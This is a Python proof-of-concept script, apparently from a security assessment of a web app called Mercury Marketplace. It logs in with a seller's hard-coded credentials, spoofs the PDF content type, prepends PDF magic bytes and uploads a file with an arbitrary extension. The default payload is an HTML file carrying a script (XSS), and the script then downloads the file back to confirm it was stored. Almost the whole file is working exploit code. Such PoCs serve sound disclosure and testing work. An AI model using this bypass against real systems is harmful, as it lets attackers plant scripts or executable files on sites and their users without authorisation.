#!/usr/bin/env python3
"""
VULN-002 — File Upload Bypass (Mercury Marketplace)
Endpoint: POST /api/drive/upload
Auth    : Seller account required

Two checks are present but both bypassable:
  1. content_type must be "application/pdf"  → spoofed in the multipart request
  2. magic bytes must start with b"%PDF"     → prepend "%PDF" to any payload

File extension is taken from file.filename, so any extension is stored on disk.

Usage
-----
    python poc_002_file_upload_bypass.py
    python poc_002_file_upload_bypass.py --url http://localhost:8000 --ext html --payload "<script>alert(1)</script>"
"""

import argparse
import sys
import requests

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"


def banner():
    print("=" * 60)
    print("  VULN-002 — File Upload Bypass (Mercury Marketplace)")
    print("  Endpoint: POST /api/drive/upload")
    print("=" * 60)


def login(base_url: str) -> str:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": SELLER_EMAIL, "password": SELLER_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed")
        sys.exit(1)
    print(f"[+] Authenticated as {SELLER_EMAIL}")
    return token


def upload_bypass(base_url: str, token: str, ext: str, payload: str) -> int:
    filename = f"exploit.{ext.lstrip('.')}"
    # Prepend PDF magic bytes so the magic bytes check passes,
    # then append the real payload.
    content = b"%PDF-bypass\n" + payload.encode()

    print(f"[*] Uploading file: {filename!r} ({len(content)} bytes)")
    print(f"[*] Content preview: {content[:40]!r} ...")

    resp = requests.post(
        f"{base_url}/api/drive/upload",
        headers={"Authorization": f"Bearer {token}"},
        files={"file": (filename, content, "application/pdf")},
        timeout=10,
    )
    resp.raise_for_status()
    data = resp.json()
    file_id = data.get("id")
    print(f"[+] Upload accepted! id={file_id}, stored name={data.get('file_name')!r}")
    return file_id


def verify_download(base_url: str, token: str, file_id: int):
    print(f"[*] Downloading file to confirm payload stored ...")
    resp = requests.get(
        f"{base_url}/api/drive/{file_id}/download",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    resp.raise_for_status()
    print(f"[+] Downloaded {len(resp.content)} bytes")
    print(f"[+] Content-Disposition: {resp.headers.get('content-disposition', 'n/a')}")
    print()
    print("[+] ---- File Contents -----------------------------------------")
    print(resp.text[:500])
    print("----------------------------------------------------------------")


def cleanup(base_url: str, token: str, file_id: int):
    requests.delete(
        f"{base_url}/api/drive/{file_id}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    print(f"[*] Cleaned up file (id={file_id})")


def main():
    parser = argparse.ArgumentParser(description="PoC — VULN-002 File Upload Bypass")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL of the target")
    parser.add_argument("--ext", default="html", help="File extension to store (default: html)")
    parser.add_argument("--payload", default="<script>alert('XSS via upload bypass')</script>", help="File payload content")
    parser.add_argument("--no-cleanup", action="store_true", help="Skip deleting the uploaded file")
    args = parser.parse_args()

    banner()
    print(f"[*] Target   : {args.url}")
    print(f"[*] Extension: .{args.ext.lstrip('.')}")
    print(f"[*] Payload  : {args.payload[:60]}")
    print()

    token   = login(args.url)
    file_id = upload_bypass(args.url, token, args.ext, args.payload)
    verify_download(args.url, token, file_id)

    if not args.no_cleanup:
        cleanup(args.url, token, file_id)

    print()
    print("[+] Done.")


if __name__ == "__main__":
    main()
